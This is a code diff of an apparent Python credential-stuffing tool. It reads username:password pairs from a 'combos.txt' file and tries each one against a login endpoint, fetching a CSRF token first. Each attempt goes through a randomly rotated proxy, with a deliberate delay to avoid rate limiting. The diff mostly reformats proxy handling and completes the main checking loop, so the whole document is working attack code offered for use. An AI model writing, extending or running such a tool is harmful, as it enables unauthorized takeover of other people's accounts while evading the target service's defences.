@@ -30,13 +30,22 @@ def load_proxies(proxy_file='proxies.txt'):
 
 def get_proxy_dict(proxy_url):
     if proxy_url.startswith('socks5://') or proxy_url.startswith('socks4://'):
-        return {'http': proxy_url, 'https': proxy_url}
+        return {
+            'http': proxy_url,
+            'https': proxy_url
+        }
     elif proxy_url.startswith('http://') or proxy_url.startswith('https://'):
-        return {'http': proxy_url, 'https': proxy_url}
+        return {
+            'http': proxy_url,
+            'https': proxy_url
+        }
     else:
         # Assume HTTP if no schema
         proxy_url = 'http://' + proxy_url
-        return {'http': proxy_url, 'https': proxy_url}
+        return {
+            'http': proxy_url,
+            'https': proxy_url
+        }
 
 def try_login(username, password, proxy=None):
     session = requests.Session()
@@ -46,7 +55,7 @@ def try_login(username, password, proxy=None):
 
     # Get CSRF token
     try:
-        token_req = session.post(login_url, json={}, timeout=15)  # fixed line
+        token_req = session.post(login_url, json={}, timeout=15)
     except Exception as e:
         print(f"[-] Proxy connection failed: {proxy} | {e}")
         return False
@@ -96,4 +105,27 @@ def check_credentials(file_path, proxy_file='proxies.txt'):
     proxies = load_proxies(proxy_file)
     try:
         with open(file_path, 'r', encoding='utf-8') as f:
-            for line
+            for line in f:
+                line = line.strip()
+                if ':' not in line:
+                    continue
+                username, password = line.split(':', 1)
+                print(f"\n[*] Trying: {username}:{password}")
+
+                proxy_url = random.choice(proxies) if proxies else None
+                proxy = get_proxy_dict(proxy_url) if proxy_url else None
+                if proxy_url:
+                    print(f"[🌐] Using proxy: {proxy_url}")
+
+                try_login(username, password, proxy)
+
+                print(f"[⏳] Waiting 8 seconds to avoid rate limiting...\n")
+                time.sleep(8)
+
+    except FileNotFoundError:
+        print(f"[!] Credentials file not found: {file_path}")
+    except Exception as e:
+        print(f"[!] Unexpected error: {e}")
+
+# Run the checker
+check_credentials('combos.txt', 'proxies.txt')
